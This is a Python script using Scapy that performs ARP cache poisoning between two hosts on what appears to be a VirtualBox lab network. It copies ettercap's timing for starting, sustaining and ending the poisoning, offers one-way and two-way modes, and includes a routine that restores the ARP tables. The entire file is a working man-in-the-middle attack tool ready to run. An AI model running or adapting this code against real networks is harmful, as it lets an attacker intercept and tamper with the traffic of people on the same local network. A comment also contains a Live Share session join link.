from scapy.all import *
import time

# Hardcoded for now
# https://prod.liveshare.vsengsaas.visualstudio.com/join?EE5AD55B6EBF068194A2BCB375C1A307EF78

# target one details
g_macT1 = "08:00:27:b7:c4:af"
g_ipT1 = "192.168.56.101"

# target two details
g_macT2 = "08:00:27:cc:08:6f"
g_ipT2 = "192.168.56.102"

# attacker details
g_macAtk = "08:00:27:d0:25:4b"            
g_ipAtk = "192.168.56.103"

start_count = 5 # ettercap starts poisoning with 5 packets
middle_count = 200
end_count = 3 # ettercap ends poisoning with 3 packets

start_interval = 1 # ettercap sends packets every second
middle_interval = 10 # ettercap sends packets every  10 seconds
end_interval = 1 # ettercap sends packets every second

ONE_WAY_TOKEN = "ONE_WAY_TOKEN_abfjdfsldf"

# main function
def arp_spoofing(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
    print("Begin start procedure")
    poison_m_times_every_n_secs(start_count, start_interval, time.time() - start_interval, True, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 1)

    print("Begin middle procedure")
    poison_m_times_every_n_secs(middle_count, middle_interval, time.time(), True, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 2)

    print("Begin end procedure")
    poison_m_times_every_n_secs(end_count, end_interval, time.time() - end_interval, False, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 2)


def one_way_arp_start(macT1, ipT1, ipT2, macAtk, ipAtk, iface):
    poison_m_times_every_n_secs(start_count, start_interval, time.time() - start_interval, True, macT1, ipT1, ONE_WAY_TOKEN, ipT2, macAtk, ipAtk, iface, 1)

def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type):
    arp_poison(macT1, ipT1, ONE_WAY_TOKEN, ipT2, macAtk, ipAtk, iface, pkt_type)

def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type):
    while m > 0:
        if time.time() - last_sent_time > n:
            print(m)
            if should_poison:
                arp_poison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type)
            else:
                arp_unpoison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type)     
            last_sent_time = time.time()
            m -= 1
    
def arp_poison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type):
    if macT2 == ONE_WAY_TOKEN:
        send_one_directional(macT1, ipT1, ipT2, macAtk, iface, pkt_type)
    elif macT1 == ONE_WAY_TOKEN:
        send_one_directional(macT2, ipT2, ipT1, macAtk, iface, pkt_type)
    else:
        send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type)

def arp_unpoison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type):
    if macT2 == ONE_WAY_TOKEN:
        send_one_directional(macT1, ipT1, ipT2, macT2, iface, pkt_type)
    elif macT1 == ONE_WAY_TOKEN:
        send_one_directional(macT2, ipT2, ipT1, macT1, iface, pkt_type)
    else:
        send_bi_directional(ipT2, macT2, ipT1, macT1, macT2, macT1, iface, pkt_type)    

def send_one_directional(_macT1, _ipT1, _ipT2, _macAtk, _iface, pkt_type):
    # poison ARP table of the target
    arp_t = build_packet(_macAtk, _ipT2, _macT1, _ipT1, pkt_type)

    # send the packet
    sendp(arp_t, iface=_iface)

def send_bi_directional(_ipM2, _macM2, _ipM1, _macM1, _macM31, _macM32, _iface, pkt_type):
    # poison ARP table of T1
    arp_m1 = build_packet(_macM31, _ipM2, _macM1, _ipM1, pkt_type)
    # poison ARP table of T2
    arp_m2 = build_packet(_macM32, _ipM1, _macM2, _ipM2, pkt_type)

    # send the packets
    sendp([arp_m1, arp_m2], iface=_iface)

def build_packet(macAttacker, ipToSpoof, macVictim, ipVictim, pkt_type):
    packet = Ether() / ARP()
    packet[Ether].src = macAttacker
    packet[ARP].hwsrc = macAttacker # Send the MAC address of the attacker
    packet[ARP].psrc  = ipToSpoof   # as the spoofed IP address.
    packet[ARP].hwdst = macVictim
    packet[ARP].pdst  = ipVictim
    packet[ARP].op = pkt_type # 1 = request, 2 = reply
    return packet

# call main
if __name__=="__main__":
    arp_spoofing(g_macT1, g_ipT1, g_macT2, g_ipT2, g_macAtk, g_ipAtk, "enp0s3")